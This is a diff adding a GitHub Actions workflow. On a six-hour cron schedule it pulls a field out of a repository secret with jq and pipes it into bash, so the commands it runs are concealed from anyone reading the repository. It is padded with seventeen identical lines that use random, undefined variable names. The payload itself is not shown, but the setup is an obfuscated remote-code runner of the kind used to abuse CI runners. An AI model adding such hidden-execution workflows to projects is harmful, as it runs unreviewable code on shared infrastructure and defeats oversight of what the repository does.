@@ -1,0 +1,34 @@
+name: jiusuanzhaoyisheng
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiusuanzhaoyisheng
+        env:
+          x940: ${{ secrets.x940 }}
+        run: |
+          echo $x940 | jq -r .lytw619 | /bin/bash
+          echo $eaujn79 | jq -r .xlsv550 | /bin/bash
+          echo $wyr96594 | jq -r .vjc7722 | /bin/bash
+          echo $thypu21611 | jq -r .vt1 | /bin/bash
+          echo $qozwj4773 | jq -r .gqmj253 | /bin/bash
+          echo $buxv4 | jq -r .k812 | /bin/bash
+          echo $qh81424 | jq -r .lcgrn4304 | /bin/bash
+          echo $fhl1960 | jq -r .tfz7 | /bin/bash
+          echo $am50227 | jq -r .avw3648 | /bin/bash
+          echo $fz82537 | jq -r .trz9 | /bin/bash
+          echo $jtqk54 | jq -r .u9 | /bin/bash
+          echo $tuclt36335 | jq -r .lic75576 | /bin/bash
+          echo $zzuq47661 | jq -r .j2 | /bin/bash
+          echo $ukjg093 | jq -r .q20 | /bin/bash
+          echo $yq137 | jq -r .wps964 | /bin/bash
+          echo $bkb1 | jq -r .q3563 | /bin/bash
+          echo $jii2 | jq -r .gjugc67803 | /bin/bash
+          echo $iicgt350 | jq -r .sxzmp3 | /bin/bash
+
